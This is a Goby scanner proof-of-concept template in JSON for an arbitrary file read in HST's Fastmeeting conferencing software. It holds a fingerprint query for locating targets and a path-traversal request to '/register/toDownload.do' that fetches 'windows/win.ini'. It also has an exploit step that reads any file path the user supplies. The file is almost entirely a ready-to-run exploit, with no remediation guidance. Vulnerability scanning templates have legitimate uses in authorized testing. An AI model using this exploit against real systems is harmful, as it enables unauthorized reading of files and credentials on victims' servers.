{
      "Name": "Fastmeeting Arbitrary File Read",
      "Level": "2",
      "Tags": [
            "fileread"
      ],
      "GobyQuery": "body=\"深圳银澎云计算有限公司\"",
      "Description": "hst",
      "Product": "hst",
      "Homepage": "https://www.hst.com/",
      "Author": "",
      "Impact": "Fastmeeting Arbitrary File Read",
      "Recommendation": "",
      "References": [
            "https://mp.weixin.qq.com/s/fMNE1PF5n81O1BpoDRlYkA"
      ],
      "HasExp": true,
      "ExpParams": [
            {
                  "Name": "Filepath",
                  "Type": "input",
                  "Value": "../../../../../../../../../../../../../../windows/win.ini"
            }
      ],
      "ExpTips": {
            "Type": "",
            "Content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini",
                        "follow_redirect": false,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "[fonts]",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "[extensions]",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            }
      ],
      "ExploitSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/register/toDownload.do?fileName={{{Filepath}}}",
                        "follow_redirect": false,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody||"
                  ]
            }
      ],
      "PostTime": "0000-00-00 00:00:00",
      "GobyVersion": "0.0.0"
}